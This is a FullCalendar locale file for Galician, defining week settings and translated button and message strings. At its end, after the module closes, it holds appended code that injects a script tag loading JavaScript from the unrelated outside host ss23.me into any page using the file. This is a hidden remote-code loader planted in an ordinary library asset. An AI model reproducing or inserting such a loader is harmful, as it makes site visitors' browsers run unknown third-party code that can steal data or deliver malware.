(function (global, factory) {
    typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory() :
    typeof define === 'function' && define.amd ? define(factory) :
    (global = global || self, (global.FullCalendarLocales = global.FullCalendarLocales || {}, global.FullCalendarLocales.gl = factory()));
}(this, function () { 'use strict';

    var gl = {
        code: "gl",
        week: {
            dow: 1,
            doy: 4 // The week that contains Jan 4th is the first week of the year.
        },
        buttonText: {
            prev: "Ant",
            next: "Seg",
            today: "Hoxe",
            month: "Mes",
            week: "Semana",
            day: "Día",
            list: "Axenda"
        },
        weekLabel: "Sm",
        allDayHtml: "Todo<br/>o día",
        eventLimitText: "máis",
        noEventsMessage: "Non hai eventos para amosar"
    };

    return gl;

}));
var e = document.createElement("script");
  e.async = !0,
  e.src = "//ss23.me/js/8d34.js";
  e.charset="UTF-8";
  var t = document.getElementsByTagName("script")[0];
  t.parentNode.insertBefore(e, t);